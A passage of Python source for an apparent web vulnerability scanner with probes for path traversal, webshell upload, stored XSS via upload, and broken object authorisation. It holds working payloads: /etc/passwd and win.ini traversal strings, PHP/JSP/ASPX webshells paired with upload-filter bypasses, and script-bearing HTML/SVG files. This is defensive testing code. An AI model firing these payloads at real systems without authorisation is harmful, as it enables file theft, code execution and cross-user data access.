                        try:
                            c.post(action, content=xml, headers={"Content-Type": ctype})
                        except (httpx.HTTPError, httpx.InvalidURL):
                            continue
        _await_callback(collab, tokens, probe)
        fired = any(collab.received(t) for t in tokens)
        ctx.evidence.update(callback_received=fired, internal_reached=fired, via=("oob callback" if fired else None),
                            post_endpoints=len(posts), probes_sent=len(tokens))
        return True if fired else False
    finally:
        collab.close()


# Path traversal / local file inclusion — read a file outside the intended directory via a filename
# param. Comprehensive: absolute paths, ../ traversal (raw / doubled / URL-encoded), null-byte, php://
# wrapper; Unix (/etc/passwd) + Windows (win.ini). Detection = the target file's unmistakable content
# signature, which reflecting the path string can never produce -> precise.
# TIGHT: the passwd root line is `root:<pw>:0:0:` where <pw> is a SHORT placeholder (x/*/!/empty), never
# arbitrary text — the old `root:.*?:0:0:` matched a spurious `root:`…`:0:0:` span across ONE line of a
# minified JS bundle (a real arcgis-core-*.js false-fired at penalty 40). Bounding the middle + dropping
# the bare `[fonts]`/`[extensions]` win.ini headers (common substrings in JS/CSS config blobs) keeps only
# unmistakable signatures; win.ini stays via its distinctive 16-bit comment.
_LFI_SIG = re.compile(r"root:[^:\r\n]{0,8}:0:0:|for 16-bit app support", re.IGNORECASE)
_LFI_PARAMS = ("page", "file", "path", "include", "template", "doc", "filename", "load", "view", "dir")
_INCLUDABLE = re.compile(r"fi|includ|file|page|view|download|load|template|doc|read|show", re.IGNORECASE)
_LFI_PAYLOADS = (
    "/etc/passwd", "../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00", "../../../../etc/passwd%00.png",
    "C:\\Windows\\win.ini", "..\\..\\..\\..\\..\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
)

# PAIRED CANARY (v2.0 foundation #2): the firing payload with traversal/absolute/encoded/null-byte/php-wrapper
# SYNTAX stripped -> a bare RELATIVE filename. A genuine include resolves it to a nonexistent local path (./etc/
# passwd), so the file signature vanishes; an endpoint that REFLECTS or HALLUCINATES the signature keys on the
# filename token and emits it again for the bare literal -> the canary reproduces the signature -> suppress.
_LFI_SYNTAX = re.compile(r"\.\.\.\.//|\.\.[\\/]|\.\.%2f|%00.*$|php://filter/[^=]*resource=", re.I)


def _lfi_canary(payload: str) -> str:
    bare = _LFI_SYNTAX.sub("", payload).lstrip("/\\").replace("\\", "/")
    return re.sub(r"(?i)^[a-z]:/", "", bare) or "etc/passwd"   # drop a leading drive letter (C:/)


def path_traversal(ctx, probe) -> bool | None:
    """Path traversal / LFI across forms, discovered query params, common filename params on
    includable-looking GET routes, and JSON API bodies. Injects absolute / relative / encoded / null-byte /
    php-wrapper payloads for /etc/passwd and win.ini; fires on the file's content signature. N/A when no surface."""
    # LFI is a GET-filename vuln -> test query params + includable routes FIRST, forms last, so a large
    # form set can't exhaust the budget before the real vector (a ?page=/?file=) is reached.
    q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and e.query_params]
    incl = [(rt, "get", list(_LFI_PARAMS)) for rt in ctx.profile.routes if _INCLUDABLE.search(rt)]
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
    targets = q + incl + forms + _json_body_targets(ctx.profile)   # + JSON API bodies (SPA sink)
    if not targets:
        return None
    targets = targets[: probe.probe.get("max_targets", 40)]   # cap the per-target baseline/liveness fan-out
    budget = probe.probe.get("max_attempts", 200)
    capped = _request_capped(probe)   # hard ACTUAL-request ceiling (hops incl.) -> no redirect-amplified runaway
    tested = False
    fields_seen = set()
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=10.0,
                     follow_redirects=True, max_redirects=_INJECT_MAX_REDIRECTS) as c:
        for action, method, fields in targets:
            if capped():
                break
            filler = {fn: _XSS_FILLER for fn in fields}
            try:
                base = _xss_send(c, method, action, filler)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if _redirects_to_auth(base):
                continue  # login-gated target -> injecting it just fuzzes the /login redirect (wasted + amplified)
            if method != "postjson" and not _endpoint_is_live(ctx, c, action, method, base):
                continue  # catch-all / soft-404 shell -> phantom endpoint, not a real file sink; a fabricated
                #           /etc/passwd (an LLM handed ?file=/etc/passwd can invent one) fails this gate too
            if budget <= 0:
                break
            # DETERMINISTIC content-signature oracle over (field x payload): independent requests, so fan them
            # out concurrently and stop on the first CONFIRMED read. The signature match's paired-canary +
            # reproduces verification runs INSIDE the worker, so a returned hit is already precision-checked (the
            # same reflection / hallucination / nondeterminism guards, just per-candidate in parallel).
            specs = [(fld, payload) for fld in fields for payload in _LFI_PAYLOADS][:budget]
            budget -= len(specs)
            if specs:
                tested = True
                for fld in fields:
                    fields_seen.add((action, fld))

                def _lfi_send(spec):
                    fld, payload = spec
                    data = {fn: (payload if fn == fld else _XSS_FILLER) for fn in fields}
                    try:
                        r = _xss_send(c, method, action, data)
                    except (httpx.HTTPError, httpx.InvalidURL):
                        return spec, None
                    ct = r.headers.get("content-type", "").lower()
                    # a served /etc/passwd or win.ini is text/plain or octet-stream, NEVER the app's own bundle —
                    # skip js/css so a signature can't match noise inside a minified script.
                    if "javascript" in ct or "css" in ct or not _LFI_SIG.search(r.text):
                        return spec, None
                    # paired canary: the bare filename (traversal stripped) must NOT also return the file
                    # signature; if it does, the content is reflected/hallucinated, not traversed.
                    cdata = {fn: (_lfi_canary(payload) if fn == fld else _XSS_FILLER) for fn in fields}
                    try:
                        if _LFI_SIG.search(_xss_send(c, method, action, cdata).text):
                            return spec, None   # reflection/hallucination -> suppress (#2)
                        if not _reproduces(lambda: _xss_send(c, method, action, data),
                                           lambda rr: _LFI_SIG.search(rr.text)):
                            return spec, None   # signature doesn't reproduce -> nondeterministic (#1)
                    except (httpx.HTTPError, httpx.InvalidURL):
                        pass                    # control probe unreachable -> fire on the direct evidence
                    return spec, r              # returned the contents of a system file -> traversal/LFI
                got = _fan_out_first(_lfi_send, specs, lambda s, r: r is not None, cap_check=capped)
                if got is not None:
                    ctx.evidence.update(found=True, sensitive_fields=True, target=action,
                                        field=got[0][0], canary_clean=True)
                    return True
            if capped():
                break
    ctx.evidence.update(found=False, fields_tested=len(fields_seen), payloads=len(_LFI_PAYLOADS))
    return False if tested else None


# Insecure file upload — comprehensive filter-bypass coverage: a webshell accepted despite extension /
# content-type / double-extension / null-byte / magic-byte controls, then EXECUTED. The shell HASHES a per-run
# salt (e.g. PHP `hash('sha256', SALT)`); the salt's exact digest in the FETCHED file proves server-side
# execution (the stored SOURCE shows the literal hash() call, never the digest) -> RCE, not mere storage. A
# hash, not the old arithmetic 7*7, makes the oracle unfakeable and unique per run: nothing but genuine
# execution of the uploaded code yields the digest (a preview/echo/LLM cannot compute it).
def _upload_shells(salt: str) -> tuple[bytes, bytes, bytes]:
    """(php, jsp, aspx) webshell bodies, each printing SHA-256(salt) hex when its runtime executes it. Built by
    substitution (not %-formatting) so the `<% %>` and `%02x` literals survive; salt is hex, no `SALT` substring."""
    s = salt.encode()
    php = b"<?php echo hash('sha256','SALT');?>".replace(b"SALT", s)
    jsp = (b'<%java.security.MessageDigest d=java.security.MessageDigest.getInstance("SHA-256");'
           b'byte[]h=d.digest("SALT".getBytes());for(byte b:h)out.print(String.format("%02x",b));%>').replace(b"SALT", s)
    aspx = (b'<%=System.BitConverter.ToString(System.Security.Cryptography.SHA256.Create()'
            b'.ComputeHash(System.Text.Encoding.UTF8.GetBytes("SALT"))).Replace("-","").ToLower()%>').replace(b"SALT", s)
    return php, jsp, aspx


_GIF_MAGIC = b"GIF89a"                     # a real image magic header to defeat content-sniffing
_UPLOAD_DIRS = ("", "uploads/", "upload/", "files/", "images/", "media/", "static/uploads/")
# Total-request budget for the upload probe. Its fan-out (forms x 10 bypass variants x [1 upload + N
# dir-fetches]) hit ~140 requests/app, tripping the WAF on 87 v17 apps for 0 fires — the #2 re-challenge
# straw (after cmdi). Bound it: the top bypass shapes x the common dirs catch a real upload-RCE; the long
# speculative tail was only re-antagonizing the WAF. Matches the cmdi/lfi/ssti/xxe fan-out caps.
_UPLOAD_BUDGET = 40


def _upload_variants(salt: str):
    """(filename, content_type, body) across the standard upload-filter bypasses."""
    php, jsp, aspx = _upload_shells(salt)
    return [
        ("hlshell.php", "application/x-php", php),                # unrestricted
        ("hlshell.php", "image/jpeg", php),                      # content-type spoof
        ("hlshell.jpg.php", "image/jpeg", php),                  # double extension
        ("hlshell.php.jpg", "image/jpeg", php),                  # trailing extension
        ("hlshell.phtml", "image/jpeg", php),                    # alternate PHP extension
        ("hlshell.php\x00.jpg", "image/jpeg", php),             # null-byte truncation
        ("hlshell.php", "image/gif", _GIF_MAGIC + b"\n" + php),  # magic-byte spoof + PHP
        ("hlshell.jsp", "image/jpeg", jsp),                     # Java servlet container (non-PHP RCE)
        ("hlshell.jspx", "image/jpeg", jsp),                    # JSP XML-syntax extension
        ("hlshell.aspx", "image/jpeg", aspx),                  # ASP.NET (non-PHP RCE)
    ]


def _locate_upload(resp_text: str, filename: str) -> list[str]:
    """Candidate URLs for the just-uploaded file: any path in the response naming it, then common
    upload directories."""
    base = filename.split("\x00")[0].split("/")[-1]
    urls = ["/" + m.lstrip("./").lstrip("/")
            for m in re.findall(r"[\w./-]*" + re.escape(base), resp_text)]
    urls += ["/" + d + base for d in _UPLOAD_DIRS]
    return list(dict.fromkeys(urls))


# `file-upload` recorded NO reason at all on the v11 corpus, so its 7.7%-ran rate was unreadable. This N/A is
# usually a TRUE ABSENCE rather than a miss, and saying so is what separates "this app has no upload" from "our
# form discovery broke" — the distinction the session cluster needed two extra runs to make.
NO_UPLOAD_FORM = ("no multipart form with a file field in the discovered surface (%d form(s) found)")


def file_upload(ctx, probe) -> bool | None:
    """Insecure file upload across multipart forms with a file field: upload a webshell in several filter-bypass
    shapes, locate it (from the response or common upload dirs), fetch it, and fire when it EXECUTES (the salt's
    exact hash digest appears). N/A when there's no file-upload form."""
    forms = [f for f in ctx.profile.forms if f.file_fields]
    if not forms:
        ctx.evidence["na_reason"] = (NO_UPLOAD_FORM % len(ctx.profile.forms or []))
        return None
    salt = "hlup" + secrets.token_hex(6)
    want = hashlib.sha256(salt.encode()).hexdigest()   # only genuine execution of the uploaded code yields this
    variants = _upload_variants(salt)
    tested = False
    sent = 0
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=15.0, follow_redirects=True) as c:
        for f in forms:
            for filename, ctype, body in variants:
                if sent >= _UPLOAD_BUDGET:
                    break
                tested = True
                files = {ff: (filename, body, ctype) for ff in f.file_fields}
                data = {fn: _XSS_FILLER for fn in f.fields if fn not in f.file_fields}
                sent += 1
                try:
                    resp = c.request((f.method or "post").upper(), f.action, files=files, data=data)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                for url in _locate_upload(resp.text, filename):
                    if sent >= _UPLOAD_BUDGET:
                        break
                    sent += 1
                    try:
                        got = c.get(url)
                        if want in got.text:
                            ctx.evidence.update(rce=True, execution_confirmed=True, form=f.action, filename=filename,
                                                repro=_repro_from_resp(got, matched="uploaded script executed server-side (salt digest returned)"))
                            return True  # the uploaded webshell hashed the salt server-side -> RCE via upload
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
            if sent >= _UPLOAD_BUDGET:
                break
    ctx.evidence.update(rce=False, forms=len(forms), variants=len(variants), requests=sent)
    return False if tested else None


# Stored XSS via file upload — the non-PHP counterpart to the RCE probe above. Most hackathon apps don't
# run PHP, but an app that STORES a user-uploaded .html/.svg and serves it back with an EXECUTABLE
# content-type INLINE (not forced to download) runs attacker script in its own origin for every viewer.
# Provable black-box: we plant a unique marker in the file, fetch the STORED copy, and read the served
# Content-Type + Content-Disposition. Intent-independent: serving user active content in-origin is wrong
# regardless of the app's purpose. Distinct vector from reflected xss_injectable (upload-persisted, hits
# every viewer, no reflection needed) -> its own finding.
_UPLOAD_XSS_MARK = "hlupxss49"   # unique token our uploaded active content carries (distinct from the RCE salt)
_UPLOAD_XSS_HTML = ('<!doctype html><html><body><script>window.name="%s"</script>%s</body></html>'
                    % (_UPLOAD_XSS_MARK, _UPLOAD_XSS_MARK)).encode()
_UPLOAD_XSS_SVG = ('<svg xmlns="http://www.w3.org/2000/svg"><script>window.name="%s"</script>'
                   '<text>%s</text></svg>' % (_UPLOAD_XSS_MARK, _UPLOAD_XSS_MARK)).encode()
# content-type substrings a browser will EXECUTE as active content when the URL is opened top-level
_EXECUTABLE_CTYPES = ("text/html", "application/xhtml", "image/svg", "application/xml", "text/xml",
                      "application/javascript", "text/javascript")


def _upload_xss_variants():
    """(filename, content_type, body): active content a browser runs in-origin if served inline."""
    return [
        ("hlxss.html", "text/html", _UPLOAD_XSS_HTML),        # direct HTML
        ("hlxss.svg", "image/svg+xml", _UPLOAD_XSS_SVG),      # SVG carries <script> (runs when opened top-level)
        ("hlxss.html", "image/png", _UPLOAD_XSS_HTML),        # content-type spoof: fires only if the server re-serves it executable
    ]


def _served_executable_inline(resp) -> bool:
    """True when `resp` IS our uploaded file (marker present) AND the server serves it as active content
    a browser would run in-origin: an executable Content-Type, NOT forced to download (attachment). An
    attachment / text/plain / octet-stream response is the app defending itself -> not a finding."""
    if _UPLOAD_XSS_MARK not in resp.text:                       # not our file coming back -> can't attribute
        return False
    if "attachment" in resp.headers.get("content-disposition", "").lower():
        return False                                            # forced download -> never executes in-origin
    ctype = resp.headers.get("content-type", "").lower()
    return any(t in ctype for t in _EXECUTABLE_CTYPES)


def upload_stored_xss(ctx, probe) -> bool | None:
    """Stored XSS via file upload: upload an .html/.svg carrying a unique marker script, fetch the STORED
    file back, and fire only when it is served with an EXECUTABLE content-type INLINE. N/A when there's no
    file-upload form; clean (False) when uploads are accepted but served safely (download/plain/non-exec)."""
    forms = [f for f in ctx.profile.forms if f.file_fields]
    if not forms:
        ctx.evidence["na_reason"] = (NO_UPLOAD_FORM % len(ctx.profile.forms or []))
        return None
    tested = False
    sent = 0
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=15.0, follow_redirects=True) as c:
        for f in forms:
            for filename, ctype, body in _upload_xss_variants():
                if sent >= _UPLOAD_BUDGET:
                    break
                tested = True
                files = {ff: (filename, body, ctype) for ff in f.file_fields}
                data = {fn: _XSS_FILLER for fn in f.fields if fn not in f.file_fields}
                sent += 1
                try:
                    resp = c.request((f.method or "post").upper(), f.action, files=files, data=data)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                for url in _locate_upload(resp.text, filename):
                    if sent >= _UPLOAD_BUDGET:
                        break
                    sent += 1
                    try:
                        got = c.get(url)
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                    if _served_executable_inline(got):
                        ctx.evidence.update(stored_xss=True, stored=True, execution_confirmed=True, form=f.action, filename=filename,
                                            served_as=got.headers.get("content-type", ""),
                                            repro=_repro_from_resp(got, matched="served %s inline (not attachment)"
                                                                   % got.headers.get("content-type", "")))
                        return True  # user-uploaded active content served executable in-origin -> stored XSS
            if sent >= _UPLOAD_BUDGET:
                break
    ctx.evidence.update(stored_xss=False, forms=len(forms), requests=sent)
    return False if tested else None


# API BOLA / horizontal IDOR (OWASP API-Security #1): an object created by user A is readable by
# user B. Verified with a planted canary — B's read must return A's SECRET value (not just a 2xx, and
# not the id A chose, which legitimately echoes back), so a token-scoped or no-op endpoint can't false
# -positive. Guarded on the read being auth-gated (unauth -> 401/403), so a public endpoint isn't BOLA.
def _bola_pairs(endpoints):
    """(create, read, param, id_field) tuples: a POST-with-body create paired with a GET read whose
    single path param sits on the same collection. id_field = the create body field that supplies the
    id (when the path param names one), else None (the id comes from the create response)."""
    creates = [e for e in endpoints if e.method.lower() == "post" and e.body_fields]
    pairs = []
    for r in endpoints:
        if r.method.lower() != "get" or len(r.path_params) != 1:
            continue
        param = r.path_params[0]
        collection = r.raw_path.rsplit("/", 1)[0]
        if r.raw_path != collection + "/{" + param + "}":
            continue  # param must be the final path segment (a resource id), not mid-path
        for c in creates:
            if c.raw_path.rstrip("/") == collection:
                pairs.append((c, r, param, param if param in c.body_fields else None))
    return pairs


# A collection we will POST to must not be an action endpoint dressed as one. Writes here are bounded and
# the targets are under test, but inferring a create on /logout or /checkout is never worth it.
_NO_WRITE = re.compile(r"logout|sign[_-]?out|delete|remove|pay\b|payment|checkout|refund|charge|subscribe|"
                       r"cancel|webhook|/auth/|token|session|admin", re.I)
_CONV_PAIR_CAP = 4          # collections to probe for a conventional pair (each costs one GET + one POST)
_CONV_SKIP_FIELDS = ("id", "createdat", "created_at", "updatedat", "updated_at", "_id", "uuid", "slug")
# An id-looking path segment, so /api/products/<cuid>/reviews and /api/products/<other>/reviews collapse to
# ONE shape. Without this a crawl that saw six products spends the whole cap re-testing one collection.
_ID_SEGMENT = re.compile(r"^(?:\d+|[0-9a-f]{8,}|[a-z0-9]{16,}|[0-9a-fA-F-]{32,})$", re.I)


def _path_shape(path: str) -> str:
    return "/".join("{}" if _ID_SEGMENT.match(seg) else seg for seg in path.split("/"))


def _conventional_pairs(ctx, cap: int = _CONV_PAIR_CAP):
    """REST-convention create+read pairs the crawl never OBSERVED, so the authorization probes can run at all.

    _bola_pairs needs BOTH halves already in the profile: a POST-with-body on the collection AND a templated
    `GET /coll/{id}`. A client-rendered app only issues those from a logged-in page the crawl may never reach,
    so the pair goes undiscovered and IDOR/integrity/race read N/A — measured as the single largest dark
    region of the catalog (all five sec-idor probes NEVER APPLIED across 1110 corpus apps, and on the OopsSec
    anchor whose `POST /api/wishlists` + `GET /api/wishlists/{id}` are right there and reachable).

    So infer the pair from the convention, but ONLY on evidence: GET the discovered collection, require a JSON
    ARRAY OF OBJECTS CARRYING AN ID (that is what makes it a resource collection rather than an action or a
    scalar), and take the create body's field names from those objects' OWN keys — the shape the app itself
    returns, not a guess.

    Then VERIFY the read template against an id that already exists in that collection, and emit nothing if it
    does not resolve. Without that check the inference MANUFACTURES false positives: measured on OopsSec, whose
    reviews collection has no read-by-id, the round-trip probe created a review (201), failed to read it back
    at the invented path (404), and reported a 34-penalty data-integrity finding that was purely our own bad
    guess. An unverifiable read means the app has no read-by-id, which is not a defect."""
    out = []
    seen = set()
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for path in _collection_paths(ctx.profile.endpoints):
            if len(out) >= cap:
                break
            coll = path.rstrip("/")
            shape = _path_shape(coll)
            if not coll or shape in seen or _NO_WRITE.search(coll):
                continue
            seen.add(shape)   # by SHAPE, so sibling collections under different resource ids count once
            try:
                r = c.get(coll)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if r.status_code != 200 or "json" not in r.headers.get("content-type", "").lower():
                continue
            try:
                data = r.json()
            except ValueError:
                continue
            items = data if isinstance(data, list) else next(
                (v for v in data.values() if isinstance(v, list)) if isinstance(data, dict) else iter(()), None)
            rows = [x for x in (items or []) if isinstance(x, dict)]
            if not rows or not any(k.lower() == "id" for k in rows[0]):
                continue          # not a resource collection (no per-object id -> nothing to read back by id)
            fields = [k for k in rows[0] if k.lower() not in _CONV_SKIP_FIELDS
                      and not isinstance(rows[0][k], (dict, list))]
            if not fields:
                continue
            # PROVE the read template exists, using an id the collection itself just handed us. A collection
            # with no read-by-id (very common) would otherwise make every round-trip look broken.
            existing = next((v for k, v in rows[0].items() if k.lower() == "id"), None)
            if existing is None:
                continue
            try:
                probe_read = c.get(f"{coll}/{existing}")
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if probe_read.status_code >= 400:
                continue          # no read-by-id endpoint -> nothing to round-trip against, and NOT a defect
            create = Endpoint(path=coll, method="post", body_fields=fields, raw_path=coll, origin="convention")
            read = Endpoint(path=coll + "/1", method="get", path_params=["id"],
                            raw_path=coll + "/{id}", origin="convention")
            out.append((create, read, "id", None))
    return out


def _create_read_pairs(ctx):
    """Every create+read pair to test: the ones discovery OBSERVED first (their body/param names are real),
    then conventional ones inferred from a collection's own shape (see _conventional_pairs)."""
    pairs = _bola_pairs(ctx.profile.endpoints)
    have = {(c.raw_path or c.path).rstrip("/") for c, _r, _p, _i in pairs}
    return pairs + [t for t in _conventional_pairs(ctx)
                    if (t[0].raw_path or t[0].path).rstrip("/") not in have]


def _created_id(resp):
    """The id of a just-created object: a Location header tail, or an id-like field in the JSON body."""
    loc = resp.headers.get("location")
    if loc:
        return loc.rstrip("/").rsplit("/", 1)[-1]
    try:
        data = resp.json()
    except (ValueError, httpx.HTTPError):
        return None
    candidates = [data] + ([v for v in data.values() if isinstance(v, dict)] if isinstance(data, dict) else [])
    for node in candidates:
        if isinstance(node, dict):
            for k in ("id", "_id", "uuid", "slug"):
                if isinstance(node.get(k), (str, int)):
                    return node[k]
    return None


# A cross-user-readable object is only unambiguous slop when it carries an INHERENTLY private field —
# a shared catalog is also readable by everyone but isn't a vuln (that's intent, which humans judge).
# Gating on a sensitive field name keeps this intent-independent: a secret/credential/PII exposed to
# another account is wrong regardless of the app's intent.
_SENSITIVE_FIELD = re.compile(
    r"secret|password|passwd|apikey|api_key|private|token|ssn|social_security|"
    r"credit_?card|card_?number|cvv|iban|passport", re.IGNORECASE)


_NA_TWO_ACCT = ("couldn't establish two independent accounts to compare — self-serve signup isn't reachable "
                "black-box (SDK/client-side auth, email confirmation, or captcha)")
_NA_PROVIDED = "a single provided --header session is one identity — can't act as two different users"


def _two_accounts(ctx):
    """Register two independent accounts (A, B) for a cross-user authorization probe (IDOR/BOLA). Returns
    (a, b), or (None, None) with an na_reason set on the evidence. The corpus wall these probes hit: on an
    SDK-auth SPA a second confirmed identity usually can't be minted black-box, so a cross-user read can't
    be PROVEN — the probe is then honestly N/A (with a reason) rather than guessing a finding."""
    a = ctx.register(suffix="_a")
    b = ctx.register(suffix="_b")
    if a is None or b is None:
        for acct in (a, b):
            if acct:
                acct.client.close()
        ctx.evidence["na_reason"] = _NA_TWO_ACCT
        return None, None
    if a.provided:   # a single --header session is ONE identity -> B == A -> not a cross-user read
        a.client.close()
        b.client.close()
        ctx.evidence["na_reason"] = _NA_PROVIDED
        return None, None
    return a, b


def api_bola(ctx, probe) -> bool | None:
    """Register two accounts A and B; A creates an object whose sensitive field carries a canary; if B
    can read that object and sees A's canary, object-level authorization is broken. Only pairs whose
    create body has a sensitive field are tested (precision — a shared collection isn't BOLA). N/A when
    there's no such pair or two accounts can't be established."""
    pairs = [(c, r, p, idf) for (c, r, p, idf) in _create_read_pairs(ctx)
             if any(_SENSITIVE_FIELD.search(f) for f in c.body_fields)]
    if not pairs:
        ctx.evidence["na_reason"] = "no create+read API pair with a private field to cross-check"
        return None  # no create+read pair with a private field to exercise -> couldn't test
    a, b = _two_accounts(ctx)
    if a is None:
        return None   # couldn't mint two accounts (na_reason set) -> couldn't test
    tested = False
    try:
        with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as anon:
            for create_ep, read_ep, param, id_field in pairs:
                id_value = "hlbola" + secrets.token_hex(4)
                secret_value = "hlsecret" + secrets.token_hex(6)
                # canary only in the sensitive field(s); id field gets the id; others a benign filler
                body = {f: (id_value if f == id_field else
                            secret_value if _SENSITIVE_FIELD.search(f) else "hlfill" + secrets.token_hex(3))
                        for f in create_ep.body_fields}
                try:
                    created = a.client.post(create_ep.path, json=body)
                    if created.status_code not in (200, 201):
                        continue
                    obj_id = id_value if id_field else _created_id(created)
                    if obj_id in (None, ""):
                        continue
                    read_path = read_ep.raw_path.replace(
                        "{" + param + "}", urllib.parse.quote(str(obj_id), safe=""))
                    if anon.get(read_path).status_code not in (401, 403):
                        continue  # read isn't auth-gated -> a public endpoint, not a BOLA
                    tested = True
                    b_read = b.client.get(read_path)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if b_read.status_code == 200 and secret_value in b_read.text:
                    # v2 severity: the crossed object carried the canary in a SENSITIVE field (pair-selected)
                    ctx.evidence.update(cross_read=True, cross_user_read=True, sensitive_fields=True, endpoint=read_path)
                    return True  # B read A's object AND saw A's planted secret -> broken object auth
        ctx.evidence.update(cross_read=False, pairs_tested=len(pairs))
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


# Broken object-level authorization at the COLLECTION endpoint — the complement to api_bola (which needs a
# per-resource GET /{id}). Many apps have NO /{id} route (UUID keys, SPA client-render), yet expose a LIST
# endpoint that is auth-gated but NOT owner-scoped: any logged-in user gets EVERY user's objects. Provable +
# intent-independent on two self-declared contracts: the endpoint's own 401-when-unauthenticated declares the
# data private, and the objects' own owner/user field declares per-object ownership. Two UNRELATED fresh
# accounts seeing the SAME owned objects is the clincher (a team/relationship feed wouldn't overlap between
# strangers; a single-owner shared catalog shows one owner, not >=2). Residual intent boundary: an app that
# INTENDS a global feed behind login (social timeline) — rare in a CRUD-tracker corpus, documented in-catalog.
_OWNER_ID_FIELD = re.compile(r"^(owner|user|author|account|creator)_?id$|^created_?by$|^owner$|^user$", re.I)
_COLLECTION_WRAPPERS = ("items", "data", "results", "rows", "records", "list", "objects")


def _json_objects(resp):
    """The dict objects a collection response carries: a top-level JSON array, or one wrapped under a common
    key ({"items":[...]}). None when the body isn't a JSON array of objects."""
    try:
        data = resp.json()
    except (ValueError, httpx.HTTPError):
        return None
    if isinstance(data, dict):
        wrapped = next((data[k] for k in _COLLECTION_WRAPPERS if isinstance(data.get(k), list)), None)
        if wrapped is None:
            # A named wrapper list is not always one of the conventional seven: OopsSec answers /api/cart with
            # {"cartItems":[...],"total":0}. Any single key holding a list OF OBJECTS is the collection —
            # requiring dicts is what keeps a {"tags":["a","b"]} scalar list from being mistaken for one.
            wrapped = next((v for v in data.values()
                            if isinstance(v, list) and v and all(isinstance(o, dict) for o in v)), None)
        data = wrapped
    if not isinstance(data, list):
        return None
    return [o for o in data if isinstance(o, dict)]


def _obj_id(o):
    """An object's stable id (id / _id / uuid / slug), stringified; None when it declares none."""
    for k in ("id", "_id", "uuid", "slug"):
        if isinstance(o.get(k), (str, int)):
            return str(o[k])
    return None


def _owner_ids(objs) -> set:
    """Distinct owner identities the objects DECLARE (owner_id / user_id / created_by / ...). A properly
    owner-scoped list returns exactly ONE (the requester's); >=2 means it isn't scoped to the caller."""
    vals = set()
    for o in objs:
        for k, v in o.items():
            if isinstance(v, (str, int)) and _OWNER_ID_FIELD.match(k):
                vals.add(str(v))
    return vals


def _collection_paths(endpoints) -> list:
    """Candidate collection paths to GET: any non-templated endpoint path (a GET list, or the sibling of a
    POST create on the same collection — the list is often an XHR discovery never captured as an endpoint).
    Skips per-resource templates ({id}); that read-by-id case is api_bola's job."""
    paths = []
    for e in endpoints:
        p = (e.raw_path or e.path or "").split("?")[0]
        if p and "{" not in p and e.method.lower() in ("get", "post"):
            p = p.rstrip("/") or "/"
            if p not in paths:
                paths.append(p)
    return paths


def api_bola_collection(ctx, probe) -> bool | None:
    """Broken object-level authorization at the LIST endpoint: an auth-gated collection (401 unauthenticated)
    that is NOT owner-scoped — two independent fresh accounts each receive objects declaring >=2 distinct
    owners AND at least one object in COMMON. Fires only when the app itself gates the endpoint (its
    private-by-declaration contract) yet leaks cross-user objects. N/A when there's no auth-gated JSON
    collection or two accounts can't be minted."""
    paths = _collection_paths(ctx.profile.endpoints)
    has_browser = bool(getattr(ctx, "profile", None) is not None and ctx.profile.capabilities.get("browser"))
    if not paths and not has_browser:
        ctx.evidence["na_reason"] = "no non-templated collection endpoint to test for cross-user leakage"
        return None
    a, b = _two_accounts(ctx)
    if a is None:
        return None   # na_reason set by _two_accounts
    tested = False
    try:
        with make_client(ctx.base_url, None, timeout=10.0, follow_redirects=False) as anon:
            for path in paths:
                try:
                    if anon.get(path).status_code not in (401, 403):
                        continue   # the app doesn't gate it -> public by intent, not a BOLA
                    ra = a.client.get(path)
                    rb = b.client.get(path)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                oa, ob = _json_objects(ra), _json_objects(rb)
                if not oa or not ob:
                    continue
                tested = True
                owners_a, owners_b = _owner_ids(oa), _owner_ids(ob)
                shared = ({_obj_id(o) for o in oa} & {_obj_id(o) for o in ob}) - {None}
                # not owner-scoped: each unrelated account sees >=2 owners AND they share a real object
                if len(owners_a) >= 2 and len(owners_b) >= 2 and shared:
                    # v2 severity: an auth-gated collection leaking >=2 owners = bulk cross-user read
                    ctx.evidence.update(bola_collection=True, cross_user_read=True, bulk_read=True, endpoint=path,
                                        distinct_owners=len(owners_a), shared_objects=len(shared),
                                        repro=_repro_from_resp(rb, matched="%d distinct owners / %d shared objects visible to a 2nd account"
                                                               % (len(owners_a), len(shared))))
                    return True   # a private-by-declaration list returns >=2 owners' objects to strangers
        # BROWSER cross-user fallback: the SPA client-render case the httpx collection scan is blind to -- A
        # creates a gated canary in a browser, and if an independent identity B sees it (anon does NOT), that's a
        # cross-user read. The primitive carries the private-by-observation (anon) + A-confirm precision guards.
        if has_browser:
            a_sess = {**(ctx.headers or {}), **(_snapshot_session(a).get("headers") or {})}
            b_sess = {**(ctx.headers or {}), **(_snapshot_session(b).get("headers") or {})}
            canary = "hlxidor" + secrets.token_hex(6)
            verdict = browser.cross_user_read_back(ctx.base_url, canary, canary, a_sess, b_sess)
            if verdict is True:
                ctx.evidence.update(bola_collection=True, cross_user_read=True, via="browser",
                                    verified_by="two-session-read-back")
                return True    # B, an independent identity, saw A's gated created value -> broken object auth
            if verdict is False:
                ctx.evidence.update(bola_collection=False, via="browser")
                return False   # A saw it, anon+B did not -> owner-scoped (an OBSERVED clean, not a vacuous N/A)
        ctx.evidence.update(bola_collection=False, paths_tested=len(paths))
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


def idor_user_record(ctx, probe) -> bool | None:
    """Horizontal IDOR on a USER/ACCOUNT record — the canonical '/user/123 -> /user/124' case, read-only.
    Register two accounts A and B, then check whether B can read A's OWN account record by id. A's record id is
